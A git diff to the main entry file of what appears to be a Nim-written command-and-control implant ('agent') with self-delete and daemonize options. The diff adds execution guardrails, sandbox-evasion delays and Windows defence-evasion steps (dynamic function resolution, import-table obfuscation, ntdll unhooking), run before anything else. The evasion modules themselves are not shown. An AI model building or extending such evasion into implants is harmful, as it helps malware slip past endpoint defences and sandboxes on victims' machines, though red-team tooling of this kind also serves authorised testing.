@@ -11,12 +11,19 @@ elif defined(service):
 else:
   # Executable build - use standard main entry point
   import agent
+  import utils/guardrails
 
   # Conditional imports for Windows-only features
   when defined(windows):
     when defined(selfDelete):
       import utils/self_delete
     import winim/lean
+
+    # Evasion imports
+    when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll):
+      import utils/evasion
+    when defined(sandbox_evasion):
+      import utils/sandbox
 
   when defined(linux):
     import posix
@@ -51,6 +58,20 @@ else:
 
   # Main entry point
   proc main() =
+    # Check execution guardrails before anything else
+    if not checkGuardrails():
+      return
+
+    # Run sandbox evasion delay before anything else
+    when defined(windows):
+      when defined(sandbox_evasion):
+        runSandboxEvasion()
+
+    # Run evasion techniques as early as possible
+    when defined(windows):
+      when defined(evasion_dfr) or defined(evasion_iat_obf) or defined(evasion_unhook_ntdll):
+        runEvasionInit()
+
     # Daemonize if compile flag is set
     when defined(daemonize):
       if daemonize():
